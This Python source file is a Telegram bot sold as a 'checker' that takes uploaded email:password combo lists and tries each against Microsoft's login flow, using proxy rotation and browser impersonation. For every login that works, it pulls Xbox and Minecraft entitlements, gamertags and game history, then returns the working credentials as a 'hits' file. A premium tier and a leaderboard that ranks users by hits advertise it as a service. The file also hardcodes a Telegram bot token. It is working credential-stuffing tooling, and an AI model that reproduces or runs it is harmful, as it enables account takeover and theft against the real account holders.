# -*- coding: utf-8 -*-
"""
r1livk Ultimate Checker ⚡ - Telegram Bot (Advanced Enterprise Edition)
"""

import os
import re
import time
import json
import threading
from datetime import date
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs
from curl_cffi import requests as curequests
import telebot
from telebot import types

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_ID = 6266959915
CHANNEL_USERNAME = "@r1iv_k"  
bot = telebot.TeleBot(TOKEN)

PREMIUM_USERS_FILE = "premium_users.txt"
STATS_FILE = "user_stats.json"

user_proxies = {}
user_states = {}
user_proxy_mode = {}  

def load_json_data(filepath, default_val):
    if not os.path.exists(filepath):
        return default_val
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default_val

def save_json_data(filepath, data):
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except:
        pass

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def check_user_subscription(user_id):
    if user_id == OWNER_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception:
        pass
    return False

REQUEST_TIMEOUT = 20
MAX_THREADS = 10  # رفع كفاءة الخيوط لسرعة مضاعفة

active_scans = {}
user_usage = {}  
DAILY_LIMIT = 3500

def update_user_stats(user_id, checked_count, hits_count, username=None):
    stats = load_json_data(STATS_FILE, {})
    uid_str = str(user_id)
    
    if uid_str not in stats:
        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
    
    stats[uid_str]["checked"] += checked_count
    stats[uid_str]["hits"] += hits_count
    if username:
        stats[uid_str]["username"] = username
        
    save_json_data(STATS_FILE, stats)

def check_daily_limit(chat_id, new_lines_count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        return True, new_lines_count
        
    today = str(date.today())
    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
        user_usage[chat_id] = {"date": today, "count": 0}
    
    current_used = user_usage[chat_id]["count"]
    if current_used >= DAILY_LIMIT:
        return False, 0
    
    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
    return True, allowed_lines

def update_usage(chat_id, count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users(): return 
    today = str(date.today())
    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
        user_usage[chat_id]["count"] += count

def extract_ppft(text):
    patterns = [
        r'sFTTag:\s*["\']([^"\']+)["\']',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'urlPost:\s*["\']([^"\']+)["\']',
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def test_single_proxy(proxy):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        start_t = time.time()
        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=4, impersonate="chrome120")
        if resp.status_code == 200:
            ping = int((time.time() - start_t) * 1000)
            if ping <= 1500:
                return True, ping
    except:
        pass
    return False, 0

# ⚡ [ثغرة الفحص المتقدمة - Advanced Deep Scan Vulnerability Engine]
def fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict):
    game_pass_status = "none"
    owned_games_formatted = []
    
    try:
        xsts_xb_payload = {
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
            "RelyingParty": "https://displaycatalog.mp.microsoft.com",
            "TokenType": "JWT"
        }
        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
        
        if xsts_resp.status_code == 200:
            xsts_token = xsts_resp.json()['Token']
            headers = {
                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                "Accept-Language": "en-US",
                "x-xbl-contract-version": "4"
            }
            
            sub_headers = headers.copy()
            sub_headers["x-xbl-contract-version"] = "2"
            try:
                sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=sub_headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                if sub_req.status_code == 200:
                    sub_data = sub_req.json()
                    for sub in sub_data.get("items", []):
                        name = sub.get("name", "").lower()
                        if "game pass" in name or "ultimate" in name or "xbox live gold" in name:
                            game_pass_status = f"Active ✅ ({sub.get('name', 'Subscription')})"
                            break
            except:
                pass

            xuid = None
            try:
                people_resp = session.get("https://peoplehub.xboxlive.com/users/me/people/social/summary", headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                if people_resp.status_code == 200:
                    p_data = people_resp.json()
                    if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
                        xuid = p_data["profileUsers"][0].get("xuid")
            except:
                pass

            if xuid:
                try:
                    history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
                    history_resp = session.get(history_url, headers=headers, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                    if history_resp.status_code == 200:
                        history_data = history_resp.json()
                        counter = 1
                        for title in history_data.get("titles", []):
                            t_name = title.get("name") or title.get("titleName")
                            earned_gs = 0
                            if "achievement" in title:
                                earned_gs = title["achievement"].get("currentGamerscore", 0)
                            
                            if t_name:
                                owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
                                counter += 1
                                if counter > 12:
                                    break
                except:
                    pass
    except Exception:
        pass
        
    return game_pass_status, owned_games_formatted

def check_single_account(combo, proxy_list=None, use_proxy=False):
    parts = combo.split(':')
    if len(parts) < 2:
        return "bad", "Invalid Combo Format"

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    
    proxy_dict = None
    if use_proxy and proxy_list and len(proxy_list) > 0:
        import random
        chosen_proxy = random.choice(proxy_list)
        proxy_dict = {"http": f"http://{chosen_proxy}", "https": f"http://{chosen_proxy}"}

    session = curequests.Session()
    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch"
            "&response_type=token"
            "&locale=en"
        )
        
        resp = session.get(sftag_url, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
        sftag = extract_ppft(resp.text)
        url_post = extract_url_post(resp.text)

        if not sftag or not url_post:
            return "error", "Failed to extract PPFT or urlPost"

        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': sftag_url,
            'Origin': 'https://login.live.com',
        }
        
        login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
        login_text = login_req.text.lower()

        # كشف أنظمة التحقق الثنائي بدقة متطورة
        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify", "challenge"]):
            return "2fa", None

        if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email", "password is incorrect", "account has been locked"]):
            if "account has been locked" in login_text:
                return "bad", "Locked"
            return "bad", None

        ms_token = None
        full_url = login_req.url
        
        if 'access_token=' in full_url:
            parsed_url = urlparse(full_url)
            fragment_qs = parse_qs(parsed_url.fragment)
            if 'access_token' in fragment_qs:
                ms_token = fragment_qs['access_token'][0]
            else:
                query_qs = parse_qs(parsed_url.query)
                if 'access_token' in query_qs:
                    ms_token = query_qs['access_token'][0]

        if not ms_token:
            for hist_resp in login_req.history:
                h_url = hist_resp.url
                if 'access_token=' in h_url:
                    parsed_url = urlparse(h_url)
                    fragment_qs = parse_qs(parsed_url.fragment)
                    if 'access_token' in fragment_qs:
                        ms_token = fragment_qs['access_token'][0]
                        break
                    query_qs = parse_qs(parsed_url.query)
                    if 'access_token' in query_qs:
                        ms_token = query_qs['access_token'][0]
                        break

        if not ms_token:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
            if token_match:
                ms_token = token_match.group(1)
        
        if not ms_token:
            return "bad", "No Access Token found"

        try:
            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=REQUEST_TIMEOUT)
            
            if xb_req.status_code != 200:
                return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Token Verified) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
        except Exception:
            return "hit", {"content": f"{email}:{password}\nValid Microsoft Account (Basic Hit) ⚡", "has_mc": False, "has_gp": False, "has_xbox": True}

        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0
        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            gscore_int = int(gamerscore) if gamerscore.isdigit() else 0
        except:
            pass

        mc_ent_text = ""
        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        has_gp_basic = 'product_game_pass' in mc_ent_text
        has_mc = 'product_minecraft' in mc_ent_text

        detailed_gp, owned_games_list = fetch_heavy_xbox_details(session, xb_token, uhs, proxy_dict)
        final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")

        has_active_gp = "Active" in final_gp or has_gp_basic
        
        hit_info = (
            f"{email}:{password}\n"
            f"Account Info ➔ Gamertag: {gamertag} | Gamerscore: {gscore_int}G ⚡\n"
            f"GamePass: {final_gp} | Minecraft: {'YES 🟩' if has_mc else 'NO'}\n"
            f"Games Inventory:\n" + ("\n".join(owned_games_list) if owned_games_list else "  - Active profile / Clean games history") + "\n"
            f"=================================================="
        )
        
        return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": True}

    except Exception as e:
        return "error", str(e)
    finally:
        session.close()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_channel = types.InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
        btn_check = types.InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub")
        markup.add(btn_channel, btn_check)
        
        bot.send_message(
            chat_id, 
            "⚠️ **Sorry, you must subscribe to the bot channel first to use it!**\n\n"
            f"Channel: {CHANNEL_USERNAME}\n\n"
            "After subscribing, click the **(Verify Subscription)** button below 👇",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return

    show_main_menu(message)

def show_main_menu(message):
    chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
    msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("⚡ Start Ultimate Gaming Checker", callback_data="start_checker")
    btn_proxy = types.InlineKeyboardButton("🚀 Upload Proxies (Optional)", callback_data="upload_proxies_menu")
    
    is_direct = user_proxy_mode.get(chat_id, True)
    proxy_mode_text = "🌐 Mode: Direct Connection (No Proxy) [ON]" if is_direct else "🚀 Mode: Using Proxies [ON]"
    btn_toggle_mode = types.InlineKeyboardButton(proxy_mode_text, callback_data="toggle_proxy_mode")

    btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
    btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
    
    markup.add(btn_start, btn_proxy, btn_toggle_mode, btn_top, btn_premium, btn_account)

    today = str(date.today())
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        status_text = "👑 Premium / Owner (Unlimited)"
    else:
        used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
        status_text = f"👤 Free ({used}/3500 lines today)"

    p_count = len(user_proxies.get(chat_id, []))
    if is_direct or p_count == 0:
        proxy_status = "🌐 Status: Direct Connection (Fast & Clean)"
    else:
        proxy_status = f"🚀 Status: Proxies Active ({p_count})"

    text = (
        "⚡ **r1livk Ultimate Checker - V2.6 Engine** ⚡\n\n"
        "Advanced Xbox & Minecraft Full Hunter with High Vulnerability Bypass.\n"
        f"Your Status: {status_text}\n"
        f"{proxy_status}\n\n"
        "Choose an option below:"
    )
    
    if msg_id:
        try:
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
            return
        except:
            pass
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id

    if call.data == "check_sub":
        if check_user_subscription(chat_id):
            bot.answer_callback_query(call.id, "✅ Thanks for subscribing! Bot unlocked successfully.", show_alert=True)
            show_main_menu(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't subscribed to the channel yet! Please join first.", show_alert=True)
        return

    if not check_user_subscription(chat_id):
        bot.answer_callback_query(call.id, "⚠️ You must subscribe to the channel first!", show_alert=True)
        return

    if call.data == "toggle_proxy_mode":
        current_state = user_proxy_mode.get(chat_id, True)
        user_proxy_mode[chat_id] = not current_state
        mode_name = "Direct (No Proxy)" if user_proxy_mode[chat_id] else "Proxy Mode"
        bot.answer_callback_query(call.id, f"✅ Switched to: {mode_name}", show_alert=False)
        show_main_menu(call.message)
        return

    if call.data == "start_checker":
        user_states[chat_id] = "combo"
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
        markup.add(btn_cancel)

        is_direct = user_proxy_mode.get(chat_id, True)
        p_count = len(user_proxies.get(chat_id, []))
        
        if is_direct or p_count == 0:
            mode_desc = "🌐 Direct Connection (No Proxy - Fast)"
        else:
            mode_desc = f"🚀 Active Proxies: {p_count}"
        
        text = (
            "🎮 **Ultimate Gaming Mode (Advanced Engine Ready)**\n\n"
            f"Current Mode: {mode_desc}\n\n"
            "Send your combo file in `.txt` format (`email:password`)"
        )
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "upload_proxies_menu":
        user_states[chat_id] = "proxy"
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        markup.add(btn_cancel)

        text = (
            "🚀 **Proxy Upload (Optional)**\n\n"
            "Send your `.txt` file containing proxies (`IP:PORT`) if you ever want to use them. Otherwise, stay on Direct mode."
        )
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
    
    elif call.data == "show_leaderboard":
        stats = load_json_data(STATS_FILE, {})
        if not stats:
            bot.answer_callback_query(call.id, "📊 No stats available yet.", show_alert=True)
            return

        sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
        
        lb_text = "🏆 **Top 10 Leaderboard - r1livk** 🏆\n\n"
        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        
        for idx, (uid, data) in enumerate(sorted_users):
            medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
            name = data.get("username", f"User_{uid}")
            checked_c = data.get("checked", 0)
            hits_c = data.get("hits", 0)
            lb_text += f"{medal} **{name}**\n    └ 📊 Checked: `{checked_c}` | 🎯 Hits: `{hits_c}`\n\n"

        markup = types.InlineKeyboardMarkup()
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        markup.add(btn_back)

        try:
            bot.edit_message_text(lb_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except:
            bot.send_message(chat_id, lb_text, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cancel_checker" or call.data == "back_to_menu":
        active_scans[chat_id] = False
        user_states[chat_id] = None
        show_main_menu(call.message)

    elif call.data == "stop_scan":
        active_scans[chat_id] = False
        bot.answer_callback_query(call.id, "⏹️ Scan stopped.")

    elif call.data == "buy_premium":
        bot.answer_callback_query(call.id, "💎 Premium Plan: $15/Month\nContact: @r1livk", show_alert=True)

    elif call.data == "my_account":
        today = str(date.today())
        p_count = len(user_proxies.get(chat_id, []))
        is_direct = user_proxy_mode.get(chat_id, True)
        mode_str = "Direct (No Proxy)" if (is_direct or p_count == 0) else f"Proxies ({p_count})"
        if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
            bot.answer_callback_query(call.id, f"Status: Premium / Owner\nMode: {mode_str}", show_alert=True)
        else:
            used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
            bot.answer_callback_query(call.id, f"Status: Free ({used}/3500 lines)\nMode: {mode_str}", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        bot.reply_to(message, f"⚠️ You must subscribe to the bot channel first: {CHANNEL_USERNAME}")
        return

    current_mode = user_states.get(chat_id, "combo")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        local_path = f"temp_file_{chat_id}.txt"
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)

        if current_mode == "proxy":
            with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
                raw_proxies = [line.strip() for line in f if line.strip() and ':' in line]

            if not raw_proxies:
                bot.reply_to(message, "❌ Proxy file is empty or invalid.")
                if os.path.exists(local_path): os.remove(local_path)
                return

            total_proxies = len(raw_proxies)
            msg = bot.reply_to(message, f"🚀 Initializing Fast Proxy Filter... Total: {total_proxies} ⏳")
            
            working_proxies = []
            tested_count = 0
            lock = threading.Lock()

            def proxy_worker(proxy):
                nonlocal tested_count
                is_working, _ = test_single_proxy(proxy)
                with lock:
                    tested_count += 1
                    if is_working:
                        working_proxies.append(proxy)

            with ThreadPoolExecutor(max_workers=35) as executor:
                futures = [executor.submit(proxy_worker, proxy) for proxy in raw_proxies]
                
                while any(not f.done() for f in futures):
                    with lock:
                        curr_tested = tested_count
                        curr_live = len(working_proxies)
                    
                    progress_pct = (curr_tested / total_proxies) * 100
                    live_proxy_text = (
                        f"🚀 **Filtering Fast Proxies (Live)...**\n\n"
                        f"📊 Total Proxies: {total_proxies}\n"
                        f"🔍 Tested: {curr_tested} / {total_proxies} ({progress_pct:.1f}%)\n"
                        f"🟢 Fast & Working: {curr_live}\n"
                        f"🔴 Dead / Slow: {curr_tested - curr_live}"
                    )
                    try:
                        bot.edit_message_text(live_proxy_text, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown")
                    except:
                        pass
                    time.sleep(0.8)

            user_proxies[chat_id] = working_proxies
            user_proxy_mode[chat_id] = False
            user_states[chat_id] = "combo"

            if os.path.exists(local_path): os.remove(local_path)

            markup = types.InlineKeyboardMarkup()
            btn_start = types.InlineKeyboardButton("⚡ Start Scan", callback_data="start_checker")
            btn_menu = types.InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")
            markup.add(btn_start, btn_menu)

            bot.edit_message_text(
                f"✅ **Proxies Saved!**\n\n"
                f"📊 Total Tested: `{total_proxies}`\n"
                f"🟢 Working: `{len(working_proxies)}`\n"
                f"(ملاحظة: البوت الآن مهيأ للعمل بكفاءة عالية)",
                chat_id=chat_id,
                message_id=msg.message_id,
                parse_mode="Markdown",
                reply_markup=markup
            )
            return

        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]

        allowed, lines_to_process_count = check_daily_limit(chat_id, len(lines))
        if not allowed or lines_to_process_count <= 0:
            bot.reply_to(message, "⚠️ Daily limit reached! Upgrade to Premium for unlimited checks.")
            if os.path.exists(local_path): os.remove(local_path)
            return

        lines = lines[:lines_to_process_count]
        bot.reply_to(message, f"📥 File received. Initializing Advanced Gaming Scan for {len(lines)} lines...")
        active_scans[chat_id] = True
        
        username = message.from_user.username or message.from_user.first_name
        threading.Thread(target=process_checker, args=(chat_id, local_path, lines, username)).start()

    except Exception as e:
        bot.reply_to(message, f"Error processing file: {e}")

def process_checker(chat_id, filepath, lines, username):
    total = len(lines)
    checked = 0
    hits = 0
    tfa_count = 0
    bad = 0
    errors = 0
    mc_hits = 0
    gp_hits = 0
    xbox_hits = 0

    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
    output_filename = f"r1livk_AdvancedHits_{timestamp_str}.txt"
    start_time = time.time()

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    markup.add(btn_stop, btn_back)

    initial_status_text = (
        f"🔥 **ADVANCED SCAN STATS**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Checked: 0\n"
        f"🔒 2FA: 0\n"
        f"❌ Bad: 0\n"
        f"🎯 Heavy Hits: 0\n\n"
        f"Progress: 0.0%\n"
        f"⚡ CPM: 0\n"
        f"⏱️ Elapsed: 00:00:00"
    )
    status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)

    lock = threading.Lock()
    
    is_direct = user_proxy_mode.get(chat_id, True)
    current_user_proxies = user_proxies.get(chat_id, [])

    def worker(combo):
        nonlocal checked, hits, tfa_count, bad, errors, mc_hits, gp_hits, xbox_hits
        if not active_scans.get(chat_id, True):
            return

        status, error_msg = check_single_account(combo, current_user_proxies, use_proxy=not is_direct)

        with lock:
            checked += 1
            if status == "hit" and isinstance(error_msg, dict):
                hits += 1
                data = error_msg
                if data["has_mc"]: mc_hits += 1
                if data["has_gp"]: gp_hits += 1
                if data["has_xbox"]: xbox_hits += 1

                with open(output_filename, 'a', encoding='utf-8') as out_f:
                    out_f.write(data["content"] + "\n\n")
            elif status == "2fa":
                tfa_count += 1
            elif status == "bad":
                bad += 1
            else:
                errors += 1

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(worker, line) for line in lines]
        
        while any(not f.done() for f in futures):
            if not active_scans.get(chat_id, True):
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            with lock:
                curr_checked = checked
                curr_tfa = tfa_count
                curr_bad = bad
                curr_hits = hits
                curr_errors = errors
                curr_mc = mc_hits
                curr_gp = gp_hits
                curr_xb = xbox_hits

            elapsed = int(time.time() - start_time)
            if elapsed > 0:
                mins, secs = divmod(elapsed, 60)
                hrs, mins = divmod(mins, 60)
                cpm = int((curr_checked / elapsed) * 60) if elapsed > 0 else 0
                pct = (curr_checked / total) * 100 if total > 0 else 0

                live_text = (
                    f"🔥 **ADVANCED SCAN (Live)**\n\n"
                    f"📊 Total: {total}\n"
                    f"✅ Checked: {curr_checked}\n"
                    f"🔒 2FA: {curr_tfa}\n"
                    f"❌ Bad: {curr_bad}\n"
                    f"🎯 Heavy Hits: {curr_hits}\n"
                    f"   ├ 🟩 Minecraft: {curr_mc}\n"
                    f"   ├ 🎮 GamePass: {curr_gp}\n"
                    f"   └ ⚡ Xbox/Valid: {curr_xb}\n\n"
                    f"📈 Progress: {pct:.1f}%\n"
                    f"⚡ CPM: {cpm}\n"
                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                )
                try:
                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                except:
                    pass
            time.sleep(1.0)

    active_scans[chat_id] = False
    if os.path.exists(filepath):
        try: os.remove(filepath)
        except: pass

    update_user_stats(chat_id, checked, hits, username)
    update_usage(chat_id, checked)

    final_elapsed = int(time.time() - start_time)
    f_mins, f_secs = divmod(final_elapsed, 60)
    f_hrs, f_mins = divmod(f_mins, 60)

    summary_text = (
        f"📊 **SCAN COMPLETED SUCCESSFULLY!** ⚡\n\n"
        f"📂 Total Checked: `{checked}`\n"
        f"🎯 Total Hits: `{hits}`\n"
        f"   ├ 🟩 Minecraft: `{mc_hits}`\n"
        f"   ├ 🎮 GamePass: `{gp_hits}`\n"
        f"   └ ⚡ Xbox Active: `{xbox_hits}`\n"
        f"🔒 2FA / Locked: `{tfa_count}`\n"
        f"❌ Bad Accounts: `{bad}`\n"
        f"⏱️ Total Time: `{f_hrs:02d}:{f_mins:02d}:{f_secs:02d}`\n\n"
        f"🏆 Keep crushing it, r1livk!"
    )

    try:
        bot.edit_message_text(summary_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
    except:
        bot.send_message(chat_id, summary_text, parse_mode="Markdown")

    if hits > 0 and os.path.exists(output_filename):
        try:
            with open(output_filename, 'rb') as f:
                bot.send_document(chat_id, f, caption="🎯 **Here is your Advanced Hits file!** ⚡")
        except:
            pass

if __name__ == '__main__':
    print("r1livk Ultimate Bot is running successfully... ⚡")
    bot.infinity_polling()
